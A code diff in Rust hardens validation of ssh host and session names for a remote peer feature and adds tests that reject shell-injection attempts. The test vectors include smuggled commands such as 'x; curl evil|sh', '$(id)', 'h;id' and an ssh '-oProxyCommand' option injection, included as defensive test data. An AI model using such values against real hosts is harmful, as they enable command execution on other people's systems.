@@ -118,9 +118,18 @@ impl Presence {
             tab.panes.truncate(MAX_PANES_PER_TAB);
         }
         let clean = |s: &str, max: usize| s == crate::payload::sanitize(s, max);
+        // A hosted peer's host and name reach a remote shell: ssh joins the
+        // words after the destination into one command line. Only
+        // shell-inert characters pass, and no leading `-` (an option).
+        let inert = |s: &str, extra: &str| {
+            !s.starts_with('-')
+                && s.chars().all(|c| c.is_ascii_alphanumeric() || "._-".contains(c) || extra.contains(c))
+        };
         let ok = !p.session_name.is_empty()
             && clean(&p.session_name, MAX_SESSION_NAME_CHARS)
-            && p.host.as_deref().is_none_or(|h| !h.is_empty() && clean(h, MAX_HOST_CHARS))
+            && p.host.as_deref().is_none_or(|h| {
+                !h.is_empty() && h.len() <= MAX_HOST_CHARS && inert(h, "@:") && inert(&p.session_name, "")
+            })
             && p.tabs.iter().all(|tab| {
                 clean(&tab.name, MAX_LABEL_CHARS)
                     && tab.panes.iter().all(|pane| {
@@ -248,9 +257,18 @@ mod tests {
         assert_eq!(remote.label(), "vps/work");
         assert_eq!(Presence::parse(&remote.to_json()), Some(remote));
         let long = format!(r#""{}""#, "h".repeat(65));
-        for bad in [r#""""#, r#""\u001b[31mx""#, long.as_str()] {
+        for bad in [r#""""#, r#""\u001b[31mx""#, long.as_str(), r#""-oProxyCommand=x""#, r#""a b""#, r#""h;id""#] {
             let json = format!(r#"{{"session_name":"work","running":0,"attention":0,"host":{bad}}}"#);
             assert_eq!(Presence::parse(&json), None, "host {bad} must be rejected");
+        }
+        let ok = r#"{"session_name":"my-work_2.0","running":0,"attention":0,"host":"me@10.0.0.5:22"}"#;
+        assert!(Presence::parse(ok).is_some(), "user@ip:port and a dotted name are inert");
+        // ssh hands `zellij attach <name>` to the remote shell as one line.
+        for bad in ["x; curl evil|sh", "a b", "$(id)", "`id`", "-h", "it's"] {
+            let hosted = Presence { session_name: bad.into(), host: Some("vps".into()), ..Default::default() };
+            assert_eq!(Presence::parse(&hosted.to_json()), None, "hosted name {bad:?} must be rejected");
+            let local = Presence { session_name: bad.into(), ..Default::default() };
+            assert!(Presence::parse(&local.to_json()).is_some(), "a local name {bad:?} keeps today's rules");
         }
     }
 }
